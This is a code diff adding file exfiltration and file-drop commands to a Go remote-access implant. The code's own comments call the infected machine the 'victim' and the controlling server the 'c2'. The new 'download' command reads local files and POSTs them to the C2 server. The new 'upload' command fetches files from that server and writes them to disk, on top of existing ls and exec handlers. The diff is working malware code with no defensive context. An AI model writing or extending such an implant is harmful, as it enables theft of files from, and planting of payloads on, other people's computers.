@@ -3,7 +3,9 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"io"
 	"io/ioutil"
+	"mime/multipart"
 	"net"
 	"net/http"
 	"net/url"
@@ -117,6 +119,10 @@ func processTask(task string) {
 		} else {
 			ls(strings.Fields(task)[1])
 		}
+	} else if strings.HasPrefix(task, "download") {
+		download(strings.Fields(task)[1:])
+	} else if strings.HasPrefix(task, "upload") {
+		upload(strings.Fields(task)[1])
 	} else if strings.HasPrefix(task, "exec") {
 		if len(strings.Fields(task)) < 2 {
 			return
@@ -264,4 +270,54 @@ func ls(path string) {
 		fmt.Fprintf(b, "%s %d\t%s\t%s\n", info.Mode(), info.Size(), info.ModTime().Format(time.UnixDate), file.Name())
 	}
 	sendData(b.String())
+}
+
+func download(files []string) { // this func UPLOADS a file from the victim to the c2
+	for _, file := range files {
+		sendFile(file)
+	}
+}
+
+func upload(file string) { // this func DOWNLOADS a file from the c2 to the victim
+	resp, err := http.Get(server + "/" + file)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	out, err := os.Create(file)
+	if err != nil {
+		return
+	}
+	io.Copy(out, resp.Body)
+}
+
+func sendFile(filename string) {
+	bodyBuf := &bytes.Buffer{}
+	bodyWriter := multipart.NewWriter(bodyBuf)
+	fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)
+	if err != nil {
+		fmt.Println("error writing to buffer")
+		return
+	}
+
+	fh, err := os.Open(filename)
+	if err != nil {
+		fmt.Println("error opening file")
+		return
+	}
+	defer fh.Close()
+
+	_, err = io.Copy(fileWriter, fh)
+	if err != nil {
+		return
+	}
+
+	contentType := bodyWriter.FormDataContentType()
+	bodyWriter.Close()
+
+	resp, err := http.Post(server+"/file", contentType, bodyBuf)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
 }
